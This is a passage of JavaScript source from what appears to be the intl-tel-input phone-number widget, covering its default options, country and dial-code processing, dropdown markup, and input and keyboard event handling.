            //* Add a placeholder in the input with an example number for the selected country.
            autoPlaceholder: "polite",
            //* Modify the parentClass.
            containerClass: "",
            //* The order of the countries in the dropdown. Defaults to alphabetical.
            countryOrder: null,
            //* Add a country search input at the top of the dropdown.
            countrySearch: true,
            //* Modify the auto placeholder.
            customPlaceholder: null,
            //* Append menu to specified element.
            dropdownContainer: null,
            //* Don't display these countries.
            excludeCountries: [],
            //* Fix the dropdown width to the input width (rather than being as wide as the longest country name).
            fixDropdownWidth: true,
            //* Format the number as the user types
            formatAsYouType: true,
            //* Format the input value during initialisation and on setNumber.
            formatOnDisplay: true,
            //* geoIp lookup function.
            geoIpLookup: null,
            //* Inject a hidden input with the name returned from this function, and on submit, populate it with the result of getNumber.
            hiddenInput: null,
            //* Internationalise the plugin text e.g. search input placeholder, country names.
            i18n: {},
            //* Initial country.
            initialCountry: "",
            //* Specify the path to the libphonenumber script to enable validation/formatting.
            loadUtilsOnInit: "",
            //* National vs international formatting for numbers e.g. placeholders and displaying existing numbers.
            nationalMode: true,
            //* Display only these countries.
            onlyCountries: [],
            //* Number type to use for placeholders.
            placeholderNumberType: "MOBILE",
            //* Show flags - for both the selected country, and in the country dropdown
            showFlags: true,
            //* Display the international dial code next to the selected flag.
            separateDialCode: false,
            //* Only allow certain chars e.g. a plus followed by numeric digits, and cap at max valid length.
            strictMode: false,
            //* Use full screen popup instead of dropdown for country list.
            useFullscreenPopup: typeof navigator !== "undefined" && typeof window !== "undefined" ? //* We cannot just test screen size as some smartphones/website meta tags will report desktop resolutions.
            //* Note: to target Android Mobiles (and not Tablets), we must find 'Android' and 'Mobile'
            /Android.+Mobile|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 500 : false,
            //* Deprecated! Use `loadUtilsOnInit` instead.
            utilsScript: "",
            //* The number type to enforce during validation.
            validationNumberType: "MOBILE"
        };
        var regionlessNanpNumbers = [
            "800",
            "822",
            "833",
            "844",
            "855",
            "866",
            "877",
            "880",
            "881",
            "882",
            "883",
            "884",
            "885",
            "886",
            "887",
            "888",
            "889"
        ];
        var getNumeric = (s)=>s.replace(/\D/g, "");
        var normaliseString = (s = "")=>s.normalize("NFD").replace(/[\u0300-\u036f]/g, "").toLowerCase();
        var isRegionlessNanp = (number)=>{
            const numeric = getNumeric(number);
            if (numeric.charAt(0) === "1") {
                const areaCode = numeric.substr(1, 3);
                return regionlessNanpNumbers.indexOf(areaCode) !== -1;
            }
            return false;
        };
        var translateCursorPosition = (relevantChars, formattedValue, prevCaretPos, isDeleteForwards)=>{
            if (prevCaretPos === 0 && !isDeleteForwards) return 0;
            let count = 0;
            for(let i = 0; i < formattedValue.length; i++){
                if (/[+0-9]/.test(formattedValue[i])) count++;
                if (count === relevantChars && !isDeleteForwards) return i + 1;
                if (isDeleteForwards && count === relevantChars + 1) return i;
            }
            return formattedValue.length;
        };
        var createEl = (name, attrs, container)=>{
            const el = document.createElement(name);
            if (attrs) Object.entries(attrs).forEach(([key, value])=>el.setAttribute(key, value));
            if (container) container.appendChild(el);
            return el;
        };
        var forEachInstance = (method, ...args)=>{
            const { instances } = intlTelInput;
            Object.values(instances).forEach((instance)=>instance[method](...args));
        };
        var Iti = class {
            constructor(input, customOptions = {}){
                this.id = id++;
                this.telInput = input;
                this.highlightedItem = null;
                this.options = Object.assign({}, defaults, customOptions);
                this.hadInitialPlaceholder = Boolean(input.getAttribute("placeholder"));
            }
            //* Can't be private as it's called from intlTelInput convenience wrapper.
            _init() {
                if (this.options.useFullscreenPopup) this.options.fixDropdownWidth = false;
                if (this.options.onlyCountries.length === 1) this.options.initialCountry = this.options.onlyCountries[0];
                if (this.options.separateDialCode) this.options.nationalMode = false;
                if (this.options.allowDropdown && !this.options.showFlags && !this.options.separateDialCode) this.options.nationalMode = false;
                if (this.options.useFullscreenPopup && !this.options.dropdownContainer) this.options.dropdownContainer = document.body;
                this.isAndroid = typeof navigator !== "undefined" ? /Android/i.test(navigator.userAgent) : false;
                this.isRTL = !!this.telInput.closest("[dir=rtl]");
                const showOnDefaultSide = this.options.allowDropdown || this.options.separateDialCode;
                this.showSelectedCountryOnLeft = this.isRTL ? !showOnDefaultSide : showOnDefaultSide;
                if (this.options.separateDialCode) {
                    if (this.isRTL) this.originalPaddingRight = this.telInput.style.paddingRight;
                    else this.originalPaddingLeft = this.telInput.style.paddingLeft;
                }
                this.options.i18n = {
                    ...en_default,
                    ...this.options.i18n
                };
                const autoCountryPromise = new Promise((resolve, reject)=>{
                    this.resolveAutoCountryPromise = resolve;
                    this.rejectAutoCountryPromise = reject;
                });
                const utilsScriptPromise = new Promise((resolve, reject)=>{
                    this.resolveUtilsScriptPromise = resolve;
                    this.rejectUtilsScriptPromise = reject;
                });
                this.promise = Promise.all([
                    autoCountryPromise,
                    utilsScriptPromise
                ]);
                this.selectedCountryData = {};
                this._processCountryData();
                this._generateMarkup();
                this._setInitialState();
                this._initListeners();
                this._initRequests();
            }
            //********************
            //*  PRIVATE METHODS
            //********************
            //* Prepare all of the country data, including onlyCountries, excludeCountries, countryOrder options.
            _processCountryData() {
                this._processAllCountries();
                this._processDialCodes();
                this._translateCountryNames();
                this._sortCountries();
            }
            //* Sort countries by countryOrder option (if present), then name.
            _sortCountries() {
                if (this.options.countryOrder) this.options.countryOrder = this.options.countryOrder.map((country)=>country.toLowerCase());
                this.countries.sort((a, b)=>{
                    const { countryOrder } = this.options;
                    if (countryOrder) {
                        const aIndex = countryOrder.indexOf(a.iso2);
                        const bIndex = countryOrder.indexOf(b.iso2);
                        const aIndexExists = aIndex > -1;
                        const bIndexExists = bIndex > -1;
                        if (aIndexExists || bIndexExists) {
                            if (aIndexExists && bIndexExists) return aIndex - bIndex;
                            return aIndexExists ? -1 : 1;
                        }
                    }
                    return a.name.localeCompare(b.name);
                });
            }
            //* Add a dial code to this.dialCodeToIso2Map.
            _addToDialCodeMap(iso2, dialCode, priority) {
                if (dialCode.length > this.dialCodeMaxLen) this.dialCodeMaxLen = dialCode.length;
                if (!this.dialCodeToIso2Map.hasOwnProperty(dialCode)) this.dialCodeToIso2Map[dialCode] = [];
                for(let i = 0; i < this.dialCodeToIso2Map[dialCode].length; i++){
                    if (this.dialCodeToIso2Map[dialCode][i] === iso2) return;
                }
                const index = priority !== void 0 ? priority : this.dialCodeToIso2Map[dialCode].length;
                this.dialCodeToIso2Map[dialCode][index] = iso2;
            }
            //* Process onlyCountries or excludeCountries array if present.
            _processAllCountries() {
                const { onlyCountries, excludeCountries } = this.options;
                if (onlyCountries.length) {
                    const lowerCaseOnlyCountries = onlyCountries.map((country)=>country.toLowerCase());
                    this.countries = data_default.filter((country)=>lowerCaseOnlyCountries.indexOf(country.iso2) > -1);
                } else if (excludeCountries.length) {
                    const lowerCaseExcludeCountries = excludeCountries.map((country)=>country.toLowerCase());
                    this.countries = data_default.filter((country)=>lowerCaseExcludeCountries.indexOf(country.iso2) === -1);
                } else this.countries = data_default;
            }
            //* Translate Countries by object literal provided on config.
            _translateCountryNames() {
                for(let i = 0; i < this.countries.length; i++){
                    const iso2 = this.countries[i].iso2.toLowerCase();
                    if (this.options.i18n.hasOwnProperty(iso2)) this.countries[i].name = this.options.i18n[iso2];
                }
            }
            //* Generate this.dialCodes and this.dialCodeToIso2Map.
            _processDialCodes() {
                this.dialCodes = {};
                this.dialCodeMaxLen = 0;
                this.dialCodeToIso2Map = {};
                for(let i = 0; i < this.countries.length; i++){
                    const c = this.countries[i];
                    if (!this.dialCodes[c.dialCode]) this.dialCodes[c.dialCode] = true;
                    this._addToDialCodeMap(c.iso2, c.dialCode, c.priority);
                }
                for(let i = 0; i < this.countries.length; i++){
                    const c = this.countries[i];
                    if (c.areaCodes) {
                        const rootIso2Code = this.dialCodeToIso2Map[c.dialCode][0];
                        for(let j = 0; j < c.areaCodes.length; j++){
                            const areaCode = c.areaCodes[j];
                            for(let k = 1; k < areaCode.length; k++){
                                const partialDialCode = c.dialCode + areaCode.substr(0, k);
                                this._addToDialCodeMap(rootIso2Code, partialDialCode);
                                this._addToDialCodeMap(c.iso2, partialDialCode);
                            }
                            this._addToDialCodeMap(c.iso2, c.dialCode + areaCode);
                        }
                    }
                }
            }
            //* Generate all of the markup for the plugin: the selected country overlay, and the dropdown.
            _generateMarkup() {
                this.telInput.classList.add("iti__tel-input");
                if (!this.telInput.hasAttribute("autocomplete") && !(this.telInput.form && this.telInput.form.hasAttribute("autocomplete"))) this.telInput.setAttribute("autocomplete", "off");
                const { allowDropdown, separateDialCode, showFlags, containerClass, hiddenInput, dropdownContainer, fixDropdownWidth, useFullscreenPopup, countrySearch, i18n } = this.options;
                let parentClass = "iti";
                if (allowDropdown) parentClass += " iti--allow-dropdown";
                if (showFlags) parentClass += " iti--show-flags";
                if (containerClass) parentClass += ` ${containerClass}`;
                if (!useFullscreenPopup) parentClass += " iti--inline-dropdown";
                const wrapper = createEl("div", {
                    class: parentClass
                });
                this.telInput.parentNode?.insertBefore(wrapper, this.telInput);
                if (allowDropdown || showFlags || separateDialCode) {
                    this.countryContainer = createEl("div", {
                        class: "iti__country-container"
                    }, wrapper);
                    if (this.showSelectedCountryOnLeft) this.countryContainer.style.left = "0px";
                    else this.countryContainer.style.right = "0px";
                    if (allowDropdown) {
                        this.selectedCountry = createEl("button", {
                            type: "button",
                            class: "iti__selected-country",
                            "aria-expanded": "false",
                            "aria-label": this.options.i18n.selectedCountryAriaLabel,
                            "aria-haspopup": "true",
                            "aria-controls": `iti-${this.id}__dropdown-content`,
                            "role": "combobox"
                        }, this.countryContainer);
                        if (this.telInput.disabled) this.selectedCountry.setAttribute("disabled", "true");
                    } else this.selectedCountry = createEl("div", {
                        class: "iti__selected-country"
                    }, this.countryContainer);
                    const selectedCountryPrimary = createEl("div", {
                        class: "iti__selected-country-primary"
                    }, this.selectedCountry);
                    this.selectedCountryInner = createEl("div", {
                        class: "iti__flag"
                    }, selectedCountryPrimary);
                    this.selectedCountryA11yText = createEl("span", {
                        class: "iti__a11y-text"
                    }, this.selectedCountryInner);
                    if (allowDropdown) this.dropdownArrow = createEl("div", {
                        class: "iti__arrow",
                        "aria-hidden": "true"
                    }, selectedCountryPrimary);
                    if (separateDialCode) this.selectedDialCode = createEl("div", {
                        class: "iti__selected-dial-code"
                    }, this.selectedCountry);
                    if (allowDropdown) {
                        const extraClasses = fixDropdownWidth ? "" : "iti--flexible-dropdown-width";
                        this.dropdownContent = createEl("div", {
                            id: `iti-${this.id}__dropdown-content`,
                            class: `iti__dropdown-content iti__hide ${extraClasses}`
                        });
                        if (countrySearch) {
                            this.searchInput = createEl("input", {
                                type: "text",
                                class: "iti__search-input",
                                placeholder: i18n.searchPlaceholder,
                                role: "combobox",
                                "aria-expanded": "true",
                                "aria-label": i18n.searchPlaceholder,
                                "aria-controls": `iti-${this.id}__country-listbox`,
                                "aria-autocomplete": "list",
                                "autocomplete": "off"
                            }, this.dropdownContent);
                            this.searchResultsA11yText = createEl("span", {
                                class: "iti__a11y-text"
                            }, this.dropdownContent);
                        }
                        this.countryList = createEl("ul", {
                            class: "iti__country-list",
                            id: `iti-${this.id}__country-listbox`,
                            role: "listbox",
                            "aria-label": i18n.countryListAriaLabel
                        }, this.dropdownContent);
                        this._appendListItems();
                        if (countrySearch) this._updateSearchResultsText();
                        if (dropdownContainer) {
                            let dropdownClasses = "iti iti--container";
                            if (useFullscreenPopup) dropdownClasses += " iti--fullscreen-popup";
                            else dropdownClasses += " iti--inline-dropdown";
                            this.dropdown = createEl("div", {
                                class: dropdownClasses
                            });
                            this.dropdown.appendChild(this.dropdownContent);
                        } else this.countryContainer.appendChild(this.dropdownContent);
                    }
                }
                wrapper.appendChild(this.telInput);
                this._updateInputPadding();
                if (hiddenInput) {
                    const telInputName = this.telInput.getAttribute("name") || "";
                    const names = hiddenInput(telInputName);
                    if (names.phone) {
                        this.hiddenInput = createEl("input", {
                            type: "hidden",
                            name: names.phone
                        });
                        wrapper.appendChild(this.hiddenInput);
                    }
                    if (names.country) {
                        this.hiddenInputCountry = createEl("input", {
                            type: "hidden",
                            name: names.country
                        });
                        wrapper.appendChild(this.hiddenInputCountry);
                    }
                }
            }
            //* For each country: add a country list item <li> to the countryList <ul> container.
            _appendListItems() {
                for(let i = 0; i < this.countries.length; i++){
                    const c = this.countries[i];
                    const extraClass = i === 0 ? "iti__highlight" : "";
                    const listItem = createEl("li", {
                        id: `iti-${this.id}__item-${c.iso2}`,
                        class: `iti__country ${extraClass}`,
                        tabindex: "-1",
                        role: "option",
                        "data-dial-code": c.dialCode,
                        "data-country-code": c.iso2,
                        "aria-selected": "false"
                    }, this.countryList);
                    c.nodeById[this.id] = listItem;
                    let content = "";
                    if (this.options.showFlags) content += `<div class='iti__flag iti__${c.iso2}'></div>`;
                    content += `<span class='iti__country-name'>${c.name}</span>`;
                    content += `<span class='iti__dial-code'>+${c.dialCode}</span>`;
                    listItem.insertAdjacentHTML("beforeend", content);
                }
            }
            //* Set the initial state of the input value and the selected country by:
            //* 1. Extracting a dial code from the given number
            //* 2. Using explicit initialCountry
            _setInitialState(overrideAutoCountry = false) {
                const attributeValue = this.telInput.getAttribute("value");
                const inputValue = this.telInput.value;
                const useAttribute = attributeValue && attributeValue.charAt(0) === "+" && (!inputValue || inputValue.charAt(0) !== "+");
                const val = useAttribute ? attributeValue : inputValue;
                const dialCode = this._getDialCode(val);
                const isRegionlessNanpNumber = isRegionlessNanp(val);
                const { initialCountry, geoIpLookup } = this.options;
                const isAutoCountry = initialCountry === "auto" && geoIpLookup;
                if (dialCode && !isRegionlessNanpNumber) this._updateCountryFromNumber(val);
                else if (!isAutoCountry || overrideAutoCountry) {
                    const lowerInitialCountry = initialCountry ? initialCountry.toLowerCase() : "";
                    const isValidInitialCountry = lowerInitialCountry && this._getCountryData(lowerInitialCountry, true);
                    if (isValidInitialCountry) this._setCountry(lowerInitialCountry);
                    else if (dialCode && isRegionlessNanpNumber) this._setCountry("us");
                    else this._setCountry();
                }
                if (val) this._updateValFromNumber(val);
            }
            //* Initialise the main event listeners: input keyup, and click selected country.
            _initListeners() {
                this._initTelInputListeners();
                if (this.options.allowDropdown) this._initDropdownListeners();
                if ((this.hiddenInput || this.hiddenInputCountry) && this.telInput.form) this._initHiddenInputListener();
            }
            //* Update hidden input on form submit.
            _initHiddenInputListener() {
                this._handleHiddenInputSubmit = ()=>{
                    if (this.hiddenInput) this.hiddenInput.value = this.getNumber();
                    if (this.hiddenInputCountry) this.hiddenInputCountry.value = this.getSelectedCountryData().iso2 || "";
                };
                this.telInput.form?.addEventListener("submit", this._handleHiddenInputSubmit);
            }
            //* initialise the dropdown listeners.
            _initDropdownListeners() {
                this._handleLabelClick = (e)=>{
                    if (this.dropdownContent.classList.contains("iti__hide")) this.telInput.focus();
                    else e.preventDefault();
                };
                const label = this.telInput.closest("label");
                if (label) label.addEventListener("click", this._handleLabelClick);
                this._handleClickSelectedCountry = ()=>{
                    if (this.dropdownContent.classList.contains("iti__hide") && !this.telInput.disabled && !this.telInput.readOnly) this._openDropdown();
                };
                this.selectedCountry.addEventListener("click", this._handleClickSelectedCountry);
                this._handleCountryContainerKeydown = (e)=>{
                    const isDropdownHidden = this.dropdownContent.classList.contains("iti__hide");
                    if (isDropdownHidden && [
                        "ArrowUp",
                        "ArrowDown",
                        " ",
                        "Enter"
                    ].includes(e.key)) {
                        e.preventDefault();
                        e.stopPropagation();
                        this._openDropdown();
                    }
                    if (e.key === "Tab") this._closeDropdown();
                };
                this.countryContainer.addEventListener("keydown", this._handleCountryContainerKeydown);
            }
            //* Init many requests: utils script / geo ip lookup.
            _initRequests() {
                let { loadUtilsOnInit, utilsScript, initialCountry, geoIpLookup } = this.options;
                if (!loadUtilsOnInit && utilsScript) {
                    console.warn("intl-tel-input: The `utilsScript` option is deprecated and will be removed in a future release! Please use the `loadUtilsOnInit` option instead.");
                    loadUtilsOnInit = utilsScript;
                }
                if (loadUtilsOnInit && !intlTelInput.utils) {
                    this._handlePageLoad = ()=>{
                        window.removeEventListener("load", this._handlePageLoad);
                        intlTelInput.loadUtils(loadUtilsOnInit)?.catch(()=>{});
                    };
                    if (intlTelInput.documentReady()) this._handlePageLoad();
                    else window.addEventListener("load", this._handlePageLoad);
                } else this.resolveUtilsScriptPromise();
                const isAutoCountry = initialCountry === "auto" && geoIpLookup;
                if (isAutoCountry && !this.selectedCountryData.iso2) this._loadAutoCountry();
                else this.resolveAutoCountryPromise();
            }
            //* Perform the geo ip lookup.
            _loadAutoCountry() {
                if (intlTelInput.autoCountry) this.handleAutoCountry();
                else if (!intlTelInput.startedLoadingAutoCountry) {
                    intlTelInput.startedLoadingAutoCountry = true;
                    if (typeof this.options.geoIpLookup === "function") this.options.geoIpLookup((iso2 = "")=>{
                        const iso2Lower = iso2.toLowerCase();
                        const isValidIso2 = iso2Lower && this._getCountryData(iso2Lower, true);
                        if (isValidIso2) {
                            intlTelInput.autoCountry = iso2Lower;
                            setTimeout(()=>forEachInstance("handleAutoCountry"));
                        } else {
                            this._setInitialState(true);
                            forEachInstance("rejectAutoCountryPromise");
                        }
                    }, ()=>{
                        this._setInitialState(true);
                        forEachInstance("rejectAutoCountryPromise");
                    });
                }
            }
            _openDropdownWithPlus() {
                this._openDropdown();
                this.searchInput.value = "+";
                this._filterCountries("", true);
            }
            //* Initialize the tel input listeners.
            _initTelInputListeners() {
                const { strictMode, formatAsYouType, separateDialCode, formatOnDisplay, allowDropdown, countrySearch } = this.options;
                let userOverrideFormatting = false;
                if (/\p{L}/u.test(this.telInput.value)) userOverrideFormatting = true;
                this._handleInputEvent = (e)=>{
                    if (this.isAndroid && e?.data === "+" && separateDialCode && allowDropdown && countrySearch) {
                        const currentCaretPos = this.telInput.selectionStart || 0;
                        const valueBeforeCaret = this.telInput.value.substring(0, currentCaretPos - 1);
                        const valueAfterCaret = this.telInput.value.substring(currentCaretPos);
                        this.telInput.value = valueBeforeCaret + valueAfterCaret;
                        this._openDropdownWithPlus();
                        return;
                    }
                    if (this._updateCountryFromNumber(this.telInput.value)) this._triggerCountryChange();
                    const isFormattingChar = e?.data && /[^+0-9]/.test(e.data);
                    const isPaste = e?.inputType === "insertFromPaste" && this.telInput.value;
                    if (isFormattingChar || isPaste && !strictMode) userOverrideFormatting = true;
                    else if (!/[^+0-9]/.test(this.telInput.value)) userOverrideFormatting = false;
                    const disableFormatOnSetNumber = e?.detail && e.detail["isSetNumber"] && !formatOnDisplay;
                    if (formatAsYouType && !userOverrideFormatting && !disableFormatOnSetNumber) {
                        const currentCaretPos = this.telInput.selectionStart || 0;
                        const valueBeforeCaret = this.telInput.value.substring(0, currentCaretPos);
                        const relevantCharsBeforeCaret = valueBeforeCaret.replace(/[^+0-9]/g, "").length;
                        const isDeleteForwards = e?.inputType === "deleteContentForward";
                        const formattedValue = this._formatNumberAsYouType();
                        const newCaretPos = translateCursorPosition(relevantCharsBeforeCaret, formattedValue, currentCaretPos, isDeleteForwards);
                        this.telInput.value = formattedValue;
                        this.telInput.setSelectionRange(newCaretPos, newCaretPos);
                    }
                };
                this.telInput.addEventListener("input", this._handleInputEvent);
                if (strictMode || separateDialCode) {
                    this._handleKeydownEvent = (e)=>{
                        if (e.key && e.key.length === 1 && !e.altKey && !e.ctrlKey && !e.metaKey) {
                            if (separateDialCode && allowDropdown && countrySearch && e.key === "+") {
                                e.preventDefault();
                                this._openDropdownWithPlus();
                                return;
                            }
                            if (strictMode) {
                                const value = this.telInput.value;
                                const alreadyHasPlus = value.charAt(0) === "+";
                                const isInitialPlus = !alreadyHasPlus && this.telInput.selectionStart === 0 && e.key === "+";
                                const isNumeric = /^[0-9]$/.test(e.key);
                                const isAllowedChar = separateDialCode ? isNumeric : isInitialPlus || isNumeric;
                                const newValue = value.slice(0, this.telInput.selectionStart) + e.key + value.slice(this.telInput.selectionEnd);
                                const newFullNumber = this._getFullNumber(newValue);
                                const coreNumber = intlTelInput.utils.getCoreNumber(newFullNumber, this.selectedCountryData.iso2);
                                const hasExceededMaxLength = this.maxCoreNumberLength && coreNumber.length > this.maxCoreNumberLength;
                                let isChangingDialCode = false;
                                if (alreadyHasPlus) {
                                    const currentCountry = this.selectedCountryData.iso2;
                                    const newCountry = this._getCountryFromNumber(newFullNumber);
                                    isChangingDialCode = newCountry !== currentCountry;
                                }
                                if (!isAllowedChar || hasExceededMaxLength && !isChangingDialCode && !isInitialPlus) e.preventDefault();
                            }
                        }
                    };
                    this.telInput.addEventListener("keydown", this._handleKeydownEvent);
                }
            }
            //* Adhere to the input's maxlength attr.
            _cap(number) {
                const max = parseInt(this.telInput.getAttribute("maxlength") || "", 10);
                return max && number.length > max ? number.substr(0, max) : number;
            }
            //* Trigger a custom event on the input.
            _trigger(name, detailProps = {}) {
                const e = new CustomEvent(name, {
                    bubbles: true,
                    cancelable: true,
                    detail: detailProps
                });
                this.telInput.dispatchEvent(e);
            }
            //* Open the dropdown.
            _openDropdown() {
                const { fixDropdownWidth, countrySearch } = this.options;
                if (fixDropdownWidth) this.dropdownContent.style.width = `${this.telInput.offsetWidth}px`;
                this.dropdownContent.classList.remove("iti__hide");
                this.selectedCountry.setAttribute("aria-expanded", "true");
                this._setDropdownPosition();
                if (countrySearch) {
                    const firstCountryItem = this.countryList.firstElementChild;
                    if (firstCountryItem) {
                        this._highlightListItem(firstCountryItem, false);
                        this.countryList.scrollTop = 0;
                    }
                    this.searchInput.focus();
                }
                this._bindDropdownListeners();
                this.dropdownArrow.classList.add("iti__arrow--up");
                this._trigger("open:countrydropdown");
            }
            //* Set the dropdown position
            _setDropdownPosition() {
                if (this.options.dropdownContainer) this.options.dropdownContainer.appendChild(this.dropdown);
                if (!this.options.useFullscreenPopup) {
                    const inputPosRelativeToVP = this.telInput.getBoundingClientRect();
                    const inputHeight = this.telInput.offsetHeight;
                    if (this.options.dropdownContainer) {
                        this.dropdown.style.top = `${inputPosRelativeToVP.top + inputHeight}px`;
                        this.dropdown.style.left = `${inputPosRelativeToVP.left}px`;
                        this._handleWindowScroll = ()=>this._closeDropdown();
                        window.addEventListener("scroll", this._handleWindowScroll);
                    }
                }
            }
            //* We only bind dropdown listeners when the dropdown is open.
            _bindDropdownListeners() {
                this._handleMouseoverCountryList = (e)=>{
                    const listItem = e.target?.closest(".iti__country");
                    if (listItem) this._highlightListItem(listItem, false);
                };
                this.countryList.addEventListener("mouseover", this._handleMouseoverCountryList);
                this._handleClickCountryList = (e)=>{
                    const listItem = e.target?.closest(".iti__country");
                    if (listItem) this._selectListItem(listItem);
                };
                this.countryList.addEventListener("click", this._handleClickCountryList);
                let isOpening = true;
                this._handleClickOffToClose = ()=>{
                    if (!isOpening) this._closeDropdown();
                    isOpening = false;
                };
                document.documentElement.addEventListener("click", this._handleClickOffToClose);
                let query = "";
                let queryTimer = null;
                this._handleKeydownOnDropdown = (e)=>{
                    if ([
                        "ArrowUp",
                        "ArrowDown",
                        "Enter",
                        "Escape"
                    ].includes(e.key)) {
                        e.preventDefault();
                        e.stopPropagation();
                        if (e.key === "ArrowUp" || e.key === "ArrowDown") this._handleUpDownKey(e.key);
                        else if (e.key === "Enter") this._handleEnterKey();
                        else if (e.key === "Escape") this._closeDropdown();
                    }
                    if (!this.options.countrySearch && /^[a-zA-ZÀ-ÿа-яА-Я ]$/.test(e.key)) {
                        e.stopPropagation();
                        if (queryTimer) clearTimeout(queryTimer);
                        query += e.key.toLowerCase();
                        this._searchForCountry(query);
                        queryTimer = setTimeout(()=>{
                            query = "";
                        }, 1e3);
                    }
                };
                document.addEventListener("keydown", this._handleKeydownOnDropdown);
                if (this.options.countrySearch) {
                    const doFilter = ()=>{
                        const inputQuery = this.searchInput.value.trim();
                        if (inputQuery) this._filterCountries(inputQuery);
                        else this._filterCountries("", true);
                    };
                    let keyupTimer = null;
                    this._handleSearchChange = ()=>{
                        if (keyupTimer) clearTimeout(keyupTimer);
                        keyupTimer = setTimeout(()=>{
                            doFilter();
                            keyupTimer = null;
                        }, 100);
                    };
                    this.searchInput.addEventListener("input", this._handleSearchChange);
                    this.searchInput.addEventListener("click", (e)=>e.stopPropagation());
                }
            }
            //* Hidden search (countrySearch disabled): Find the first list item whose name starts with the query string.
            _searchForCountry(query) {
                for(let i = 0; i < this.countries.length; i++){
                    const c = this.countries[i];
                    const startsWith = c.name.substr(0, query.length).toLowerCase() === query;
                    if (startsWith) {
                        const listItem = c.nodeById[this.id];
                        this._highlightListItem(listItem, false);
                        this._scrollTo(listItem);
                        break;
                    }
                }
            }
            //* Country search enabled: Filter the countries according to the search query.
            _filterCountries(query, isReset = false) {
                let noCountriesAddedYet = true;
                this.countryList.innerHTML = "";
                const normalisedQuery = normaliseString(query);
                for(let i = 0; i < this.countries.length; i++){
                    const c = this.countries[i];
                    const normalisedCountryName = normaliseString(c.name);
                    const countryInitials = c.name.split(/[^a-zA-ZÀ-ÿа-яА-Я]/).map((word)=>word[0]).join("").toLowerCase();
                    const fullDialCode = `+${c.dialCode}`;
                    if (isReset || normalisedCountryName.includes(normalisedQuery) || fullDialCode.includes(normalisedQuery) || c.iso2.includes(normalisedQuery) || countryInitials.includes(normalisedQuery)) {
                        const listItem = c.nodeById[this.id];
                        if (listItem) this.countryList.appendChild(listItem);
                        if (noCountriesAddedYet) {
                            this._highlightListItem(listItem, false);
                            noCountriesAddedYet = false;
                        }
                    }
                }
                if (noCountriesAddedYet) this._highlightListItem(null, false);
                this.countryList.scrollTop = 0;
                this._updateSearchResultsText();
            }
            //* Update search results text (for a11y).
            _updateSearchResultsText() {
                const { i18n } = this.options;
                const count = this.countryList.childElementCount;
                let searchText;
                if (count === 0) searchText = i18n.zeroSearchResults;
                else if (count === 1) searchText = i18n.oneSearchResult;
                else searchText = i18n.multipleSearchResults.replace("${count}", count.toString());
                this.searchResultsA11yText.textContent = searchText;
            }
            //* Highlight the next/prev item in the list (and ensure it is visible).
            _handleUpDownKey(key) {
                let next = key === "ArrowUp" ? this.highlightedItem?.previousElementSibling : this.highlightedItem?.nextElementSibling;
                if (!next && this.countryList.childElementCount > 1) next = key === "ArrowUp" ? this.countryList.lastElementChild : this.countryList.firstElementChild;
                if (next) {
                    this._scrollTo(next);
                    this._highlightListItem(next, false);
                }
            }
            //* Select the currently highlighted item.
            _handleEnterKey() {
                if (this.highlightedItem) this._selectListItem(this.highlightedItem);
            }
            //* Update the input's value to the given val (format first if possible)
            //* NOTE: this is called from _setInitialState, handleUtils and setNumber.
            _updateValFromNumber(fullNumber) {
                let number = fullNumber;
                if (this.options.formatOnDisplay && intlTelInput.utils && this.selectedCountryData) {
                    const useNational = this.options.nationalMode || number.charAt(0) !== "+" && !this.options.separateDialCode;
                    const { NATIONAL, INTERNATIONAL } = intlTelInput.utils.numberFormat;
                    const format = useNational ? NATIONAL : INTERNATIONAL;
                    number = intlTelInput.utils.formatNumber(number, this.selectedCountryData.iso2, format);
                }
                number = this._beforeSetNumber(number);
                this.telInput.value = number;
            }
            //* Check if need to select a new country based on the given number
            //* Note: called from _setInitialState, keyup handler, setNumber.
            _updateCountryFromNumber(fullNumber) {
                const iso2 = this._getCountryFromNumber(fullNumber);
                if (iso2 !== null) return this._setCountry(iso2);
                return false;
            }
            _getCountryFromNumber(fullNumber) {
                const plusIndex = fullNumber.indexOf("+");
                let number = plusIndex ? fullNumber.substring(plusIndex) : fullNumber;
                const selectedDialCode = this.selectedCountryData.dialCode;
                const isNanp = selectedDialCode === "1";
                if (number && isNanp && number.charAt(0) !== "+") {
                    if (number.charAt(0) !== "1") number = `1${number}`;
                    number = `+${number}`;
                }
                if (this.options.separateDialCode && selectedDialCode && number.charAt(0) !== "+") number = `+${selectedDialCode}${number}`;
                const dialCode = this._getDialCode(number, true);
                const numeric = getNumeric(number);
                if (dialCode) {
                    const iso2Codes = this.dialCodeToIso2Map[getNumeric(dialCode)];
                    const alreadySelected = iso2Codes.indexOf(this.selectedCountryData.iso2) !== -1 && numeric.length <= dialCode.length - 1;
                    const isRegionlessNanpNumber = selectedDialCode === "1" && isRegionlessNanp(numeric);
                    if (!isRegionlessNanpNumber && !alreadySelected) for(let j = 0; j < iso2Codes.length; j++){
                        if (iso2Codes[j]) return iso2Codes[j];
                    }
                } else if (number.charAt(0) === "+" && numeric.length) return "";
                else if ((!number || number === "+") && !this.selectedCountryData.iso2) return this.defaultCountry;
                return null;
            }
            //* Remove highlighting from other list items and highlight the given item.
            _highlightListItem(listItem, shouldFocus) {
                const prevItem = this.highlightedItem;
                if (prevItem) {
                    prevItem.classList.remove("iti__highlight");
                    prevItem.setAttribute("aria-selected", "false");
                }
                this.highlightedItem = listItem;
                if (this.highlightedItem) {
                    this.highlightedItem.classList.add("iti__highlight");
                    this.highlightedItem.setAttribute("aria-selected", "true");
                    const activeDescendant = this.highlightedItem.getAttribute("id") || "";
                    this.selectedCountry.setAttribute("aria-activedescendant", activeDescendant);
                    if (this.options.countrySearch) this.searchInput.setAttribute("aria-activedescendant", activeDescendant);
                }
                if (shouldFocus) this.highlightedItem.focus();
            }
            //* Find the country data for the given iso2 code
            //* the ignoreOnlyCountriesOption is only used during init() while parsing the onlyCountries array
            _getCountryData(iso2, allowFail) {
                for(let i = 0; i < this.countries.length; i++){
                    if (this.countries[i].iso2 === iso2) return this.countries[i];
                }
                if (allowFail) return null;
                throw new Error(`No country data for '${iso2}'`);
            }
            //* Update the selected country, dial code (if separateDialCode), placeholder, title, and active list item.
            //* Note: called from _setInitialState, _updateCountryFromNumber, _selectListItem, setCountry.
            _setCountry(iso2) {
                const { separateDialCode, showFlags, i18n } = this.options;
                const prevCountry = this.selectedCountryData.iso2 ? this.selectedCountryData : {};
                this.selectedCountryData = iso2 ? this._getCountryData(iso2, false) || {} : {};
